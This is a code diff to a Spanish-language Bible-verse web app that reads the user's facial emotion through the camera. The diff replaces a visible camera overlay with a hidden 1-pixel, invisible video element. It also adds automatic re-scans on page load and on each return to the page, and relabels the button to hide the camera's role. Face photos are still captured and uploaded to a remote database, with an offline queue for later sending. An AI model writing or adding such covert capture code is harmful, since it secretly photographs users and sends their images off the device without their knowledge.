@@ -11,16 +11,25 @@
   <style>
     body { background: #121212; color: #e0e0e0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
     
-    #main-container { width: 90%; max-width: 600px; position: relative; padding-bottom: 50px; }
+    #main-container { width: 90%; max-width: 600px; position: relative; padding-bottom: 50px; z-index: 10; }
 
-    #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; }
-    #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; }
+    #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
+    #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
     
+    /* Animación de entrada */
     @keyframes fadeInUpSubtle {
         0% { opacity: 0; transform: translateY(20px); filter: blur(5px); }
         100% { opacity: 1; transform: translateY(0); filter: blur(0); }
     }
-    .fade-up { animation: fadeInUpSubtle 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
+    .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
+
+    /* Animación de "Pensando" (Pulsación suave del texto) */
+    @keyframes pulseText {
+        0% { opacity: 0.5; }
+        50% { opacity: 1; }
+        100% { opacity: 0.5; }
+    }
+    .analyzing { animation: pulseText 1.5s infinite ease-in-out; color: #03dac6; }
 
     .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; }
     button { padding: 15px 25px; border: none; cursor: pointer; border-radius: 50px; font-weight: 800; font-size: 0.9rem; width: 100%; max-width: 300px; transition: transform 0.2s; }
@@ -31,18 +40,16 @@
 
     .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
 
-    /* CÁMARA */
-    #camera-overlay {
-        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center;
+    /* --- CÁMARA FANTASMA (Invisible pero activa) --- */
+    /* No usamos display:none porque pausa la cámara en iOS. Usamos Opacidad 0 */
+    #hidden-camera-container {
+        position: fixed;
+        top: 0; left: 0;
+        width: 1px; height: 1px; /* Mínimo tamaño */
+        opacity: 0; /* Invisible al ojo */
+        z-index: -100; /* Detrás de todo */
+        pointer-events: none;
     }
-    #video-feed {
-        width: 100%; max-width: 400px; border-radius: 20px; border: 4px solid #bb86fc;
-        transform: scaleX(-1);
-    }
-    #scan-status { margin-top: 20px; font-size: 1.2rem; color: #03dac6; font-weight: bold; }
-    #btn-close-cam { position: absolute; top: 20px; right: 20px; background: rgba(255,255,255,0.2); width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; cursor: pointer; }
-
   </style>
 </head>
 <body>
@@ -52,15 +59,13 @@
     <div id="reference"></div>
     
     <div class="btn-group">
-        <button id="btn-notify" onclick="window.subscribeUser()">📸 ACTIVAR EXPERIENCIA</button>
+        <button id="btn-notify" onclick="window.subscribeUser()">✨ ACTIVAR MAGIA</button>
         <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">🔕 DETENER</button>
     </div>
   </div>
 
-  <div id="camera-overlay">
-      <div id="btn-close-cam" onclick="stopCamera()">✕</div>
+  <div id="hidden-camera-container">
       <video id="video-feed" autoplay muted playsinline></video>
-      <div id="scan-status">Iniciando...</div>
   </div>
 
   <div id="version-footer" class="version-footer">Cargando versión...</div>
@@ -72,43 +77,54 @@
     let currentVerseData = null;
     let videoStream = null;
     let modelsLoaded = false;
+    
+    // --- VARIABLES DE CONTROL ---
     let isScanning = false;
+    let lastScanTime = 0;
+    const SCAN_COOLDOWN = 15000; // 15 segs entre escaneos automáticos para evitar bucles
 
-    // --- 1. LÓGICA DE IA Y CÁMARA ---
-    window.startMoodScan = async function() {
-        const overlay = document.getElementById('camera-overlay');
-        const status = document.getElementById('scan-status');
-        const video = document.getElementById('video-feed');
-        
-        overlay.style.display = 'flex';
-        status.innerText = "Conectando cámara...";
+    // --- 1. LÓGICA DE IA INVISIBLE ---
+    window.startMoodScan = async function(force = false) {
+        if (isScanning) return; // Ya está trabajando
+
+        const now = Date.now();
+        // Si no es forzado y pasó poco tiempo, abortamos silenciosamente
+        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;
+
         isScanning = true;
 
+        // Feedback sutil: Cambiamos el texto para indicar "Sintiendo..."
+        // Esto es opcional, pero ayuda a que el cambio de texto no sea tan brusco
+        // document.getElementById('reference').innerText = "Sintiendo...";
+        // document.getElementById('reference').classList.add('analyzing');
+
         try {
+            // Pedimos cámara (Si ya tiene permiso, no sale popup)
             videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.getElementById('video-feed');
             video.srcObject = videoStream;
 
             if (!modelsLoaded) {
-                status.innerText = "Preparando IA...";
+                // Si es la primera vez, tardará un poco descargando IA
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 modelsLoaded = true;
             }
 
-            status.innerText = "Analizando tu rostro...";
+            // Iniciamos detección en segundo plano
             detectEmotionLoop();
 
         } catch (err) {
-            console.error("Error Cámara:", err);
-            alert("Para recomendarte un versículo, necesitamos verte un momento. Por favor permite el acceso a la cámara.");
-            stopCamera();
+            console.error("No se pudo acceder a la cámara:", err);
+            isScanning = false; // Liberamos
+            // Si falla, mostramos versículo random sin IA
+            renderVerse(versesDB[Math.floor(Math.random() * versesDB.length)]);
         }
     }
 
     async function detectEmotionLoop() {
         if (!isScanning) return;
         const video = document.getElementById('video-feed');
-        const status = document.getElementById('scan-status');
 
         try {
             const options = new faceapi.TinyFaceDetectorOptions();
@@ -120,29 +136,35 @@
                 const dominant = sorted[0];
                 const confidence = expressions[dominant];
 
-                status.innerText = `Detectado: ${translateEmotion(dominant)}...`;
-
-                if (confidence > 0.6) {
-                    isScanning = false; 
-                    status.innerText = "¡Procesando emoción!";
+                // Si la certeza es buena (> 50%)
+                if (confidence > 0.5) {
+                    // ¡Éxito!
+                    console.log(`IA Detectó: ${dominant} (${confidence})`);
                     
-                    // Capturar y Guardar (Ahora con soporte Offline)
+                    // 1. Guardar y Enviar (Background)
                     captureAndSave(video, dominant, confidence);
 
-                    // Mostrar versículo
-                    setTimeout(() => {
-                        stopCamera();
-                        showVerseByMood(dominant);
-                    }, 800);
+                    // 2. Actualizar Timers
+                    lastScanTime = Date.now();
+                    isScanning = false;
+
+                    // 3. Detener cámara silenciosamente
+                    stopCamera();
+
+                    // 4. Mostrar el versículo mágico
+                    // Quitamos clase de animación de carga si la hubiera
+                    document.getElementById('reference').classList.remove('analyzing');
+                    showVerseByMood(dominant);
                     return;
                 }
             }
         } catch(e) {}
 
-        if (isScanning) setTimeout(detectEmotionLoop, 100);
+        // Reintentar en 200ms
+        if (isScanning) setTimeout(detectEmotionLoop, 200);
     }
 
-    // --- LÓGICA DE GUARDADO (ONLINE + OFFLINE) ---
+    // --- LÓGICA DE GUARDADO (Queue Offline) ---
     async function captureAndSave(videoElement, emotion, confidence) {
         try {
             const canvas = document.createElement('canvas');
@@ -153,23 +175,16 @@
             ctx.scale(-1, 1);
             ctx.drawImage(videoElement, 0, 0);
 
-            // Calidad 0.5 para ahorrar espacio
             const base64Image = canvas.toDataURL('image/jpeg', 0.5);
             const verse = getVerseForMood(emotion);
-            
             const payload = { image: base64Image, emotion, confidence, verse };
 
-            // VERIFICAR CONEXIÓN
             if (navigator.onLine) {
-                // Si hay internet, enviamos ya.
                 sendToMongo(payload);
             } else {
-                // Si NO hay internet, guardamos en la mochila (localStorage)
-                console.log("📴 Offline: Guardando foto para enviar luego.");
                 saveToOfflineQueue(payload);
             }
-
-        } catch (e) { console.error("Error Save:", e); }
+        } catch (e) { console.error(e); }
     }
 
     async function sendToMongo(payload) {
@@ -179,48 +194,26 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            console.log("✅ Datos enviados a Mongo.");
-        } catch(e) {
-            console.error("Error enviando (posible caída de red):", e);
-            // Si falla el fetch aunque el navegador diga 'online', guardamos local
-            saveToOfflineQueue(payload);
-        }
+        } catch(e) { saveToOfflineQueue(payload); }
     }
 
-    // --- SISTEMA DE COLA OFFLINE ---
     function saveToOfflineQueue(payload) {
-        // Leemos la cola actual o creamos una nueva
         let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
-        
-        // Agregamos el nuevo (Limitamos a 3 fotos para no llenar la memoria del cel)
         queue.push(payload);
-        if (queue.length > 3) queue.shift(); // Si hay más de 3, borramos la más vieja
-
+        if (queue.length > 3) queue.shift();
         localStorage.setItem('mood_queue', JSON.stringify(queue));
     }
 
     async function processOfflineQueue() {
-        if (!navigator.onLine) return; // Si seguimos offline, no hacemos nada
-
+        if (!navigator.onLine) return;
         let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
         if (queue.length === 0) return;
-
-        console.log(`🔄 Recuperando conexión. Enviando ${queue.length} fotos pendientes...`);
-
-        // Enviamos cada foto guardada
-        for (const item of queue) {
-            await sendToMongo(item);
-        }
-
-        // Limpiamos la cola
+        for (const item of queue) { await sendToMongo(item); }
         localStorage.removeItem('mood_queue');
     }
 
-    // Escuchar cuando regresa el internet
     window.addEventListener('online', processOfflineQueue);
-    // Intentar enviar también al abrir la app
     window.addEventListener('load', processOfflineQueue);
-
 
     // --- UTILIDADES ---
     function getVerseForMood(mood) {
@@ -238,32 +231,37 @@
         renderVerse(getVerseForMood(mood));
     }
 
-    function translateEmotion(mood) {
-        const map = { neutral: 'Tranquilo', happy: 'Feliz', sad: 'Triste', angry: 'Enojado', fearful: 'Miedo', disgusted: 'Disgustado', surprised: 'Sorprendido' };
-        return map[mood] || mood;
-    }
-
     window.stopCamera = function() {
-        document.getElementById('camera-overlay').style.display = 'none';
-        isScanning = false;
         if (videoStream) {
             videoStream.getTracks().forEach(track => track.stop());
             videoStream = null;
         }
     }
 
-    // --- 2. RESTO DE FUNCIONES ---
+    // --- RENDERIZADO ---
     function renderVerse(data) {
         currentVerseData = data;
         const verseEl = document.getElementById('verse');
         const refEl = document.getElementById('reference');
-        verseEl.innerText = `"${data.t}"`;
-        refEl.innerText = data.r;
-        verseEl.classList.remove('fade-up');
-        refEl.classList.remove('fade-up');
-        void verseEl.offsetWidth; 
-        verseEl.classList.add('fade-up');
-        setTimeout(() => refEl.classList.add('fade-up'), 150);
+        
+        // 1. Desvanecer texto actual
+        verseEl.style.opacity = 0;
+        refEl.style.opacity = 0;
+
+        // 2. Esperar medio segundo y cambiar contenido
+        setTimeout(() => {
+            verseEl.innerText = `"${data.t}"`;
+            refEl.innerText = data.r;
+            
+            // 3. Reaparecer suavemente
+            verseEl.style.opacity = 1;
+            refEl.style.opacity = 1;
+            
+            // Reiniciar animación FadeUp si quieres movimiento
+            verseEl.classList.remove('fade-up');
+            void verseEl.offsetWidth; 
+            verseEl.classList.add('fade-up');
+        }, 500);
     }
 
     async function showVersionFromSW() {
@@ -278,7 +276,6 @@
     function updateUI(isSubscribed) {
         const btnNotify = document.getElementById('btn-notify');
         const btnUnsub = document.getElementById('btn-unsubscribe');
-        
         if (isSubscribed) { 
             btnNotify.style.display = 'none'; 
             btnUnsub.style.display = 'inline-block';
@@ -292,8 +289,6 @@
       if (!('serviceWorker' in navigator)) return;
       try {
         const registration = await navigator.serviceWorker.ready;
-        
-        // 1. Permiso de Notificación
         const permission = await Notification.requestPermission();
         if (permission !== 'granted') return;
         
@@ -312,8 +307,7 @@
         if (response.ok) { 
             localStorage.setItem('setup_v1_pwa', 'true'); 
             updateUI(true);
-            // AL SUSCRIBIRSE, LANZAMOS LA CÁMARA INMEDIATAMENTE
-            setTimeout(startMoodScan, 500); 
+            setTimeout(() => startMoodScan(true), 500); 
         } 
       } catch (err) { console.error(err); }
     }
@@ -336,6 +330,14 @@
     // --- INICIALIZACIÓN ---
     showVersionFromSW();
     renderVerse(versesDB[new Date().getDate() % versesDB.length]);
+
+    // Visibilidad (Re-escaneo al volver)
+    document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+            const isSetupDone = localStorage.getItem('setup_v1_pwa');
+            if (isSetupDone) startMoodScan(); 
+        }
+    });
     
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js', { type: 'module' }).then(reg => {
@@ -354,7 +356,6 @@
           if (isStandalone && !isSetupDone) updateUI(false); 
           else updateUI(!!sub);
 
-          // ESCANEO AUTOMÁTICO PARA USUARIOS REGISTRADOS
           if (!!sub || isSetupDone) {
               setTimeout(() => { startMoodScan(); }, 1000);
           }
